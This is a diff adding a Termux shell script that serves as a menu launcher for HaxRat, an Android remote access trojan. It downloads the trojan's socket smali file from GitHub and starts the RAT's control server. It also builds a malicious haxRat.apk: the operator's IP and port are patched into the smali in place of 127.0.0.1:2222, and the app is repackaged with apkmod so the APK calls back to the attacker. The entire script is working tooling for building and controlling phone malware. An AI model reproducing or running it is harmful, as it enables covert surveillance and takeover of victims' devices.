@@ -1,0 +1,109 @@
+#!/usr/bin/env sh
+
+if [ -e $PREFIX/bin/haxm ]
+then
+echo
+else 
+chmod +x ~/haxm
+mv ~/haxm /$PREFIX/bin/haxm
+fi
+
+if [ -e ~/haxrat/dontdelete ] 
+then
+echo
+else
+if [ -e $PREFIX/bin/curl ]
+then
+echo curl is Installed
+else
+apt install curl > /dev/null
+echo Installing curl...
+fi
+rm IOSocket.smalii > /dev/null
+
+curl -LO https://raw.githubusercontent.com/Hax4us/haxRat/master/server/app/factory/decompiled/smali/com/hax4us/haxrat/IOSocket.smali
+
+
+mv ~/IOSocket.smali ~/haxrat/dontdelete
+
+fi
+
+if [ -e $PREFIX/bin/figlet ]; then
+echo
+else
+echo "Its your first run, I guess"
+pkg install figlet
+fi
+if [ -e $PREFIX/bin/lolcat ]; then
+echo
+else
+gem install lolcat
+fi
+var=0
+until [ "$var" = "1" -o "$var" = "2" -o "$var" = "e" ]
+do
+clear
+figlet HaxRat | lolcat
+echo "            \033[33mBy Hax4us\033[0m"
+echo "                     MENU addon of HaxRat v1.0 , By Vk1033"
+echo
+
+read -p '      [1] HaxRat Server
+
+      [2] Build haxRat.apk
+
+      [e] Exit
+      
+:}=>' var
+
+if [ "$var" = "1" ]
+then
+echo "HaxRat Server started
+( Open browser and go to http://localhost:22533 )
+
+( If not opened automatically )"
+echo
+echo "( CTRL+C to stop )"
+am start -a android.intent.action.VIEW -d http://localhost:22533>  /dev/null
+haxrat
+else
+if [ "$var" = "2" ]; then
+
+read -p 'Your IP :{==>' ip
+read -p 'Port :{==>' port
+
+rm -rf ~/haxrat/temp > /dev/null
+
+cp ~/haxrat/dontdelete ~/haxrat/temp
+
+
+sed -i "s/127.0.0.1:2222/${ip}:${port}/g" ~/haxrat/temp
+
+rm /data/data/com.termux/files/usr/share/haxrat/server/app/factory/decompiled/smali/com/hax4us/haxrat/IOSocket.smali
+
+
+cp ~/haxrat/temp /data/data/com.termux/files/usr/share/haxrat/server/app/factory/decompiled/smali/com/hax4us/haxrat/IOSocket.smali
+
+apkmod -r /data/data/com.termux/files/usr/share/haxrat/server/app/factory/decompiled -o ~/haxrat/haxRat.apk
+
+rm -rf ~/haxrat/temp
+else
+
+if [ "$var" = "e" ]
+then
+rm ~/haxrat/temp > /dev/null/
+exit
+else
+echo
+fi
+
+
+echo
+echo "Invaild Selection"
+echo      
+read -p 'Press Enter to continue' abc
+fi
+fi
+
+
+done
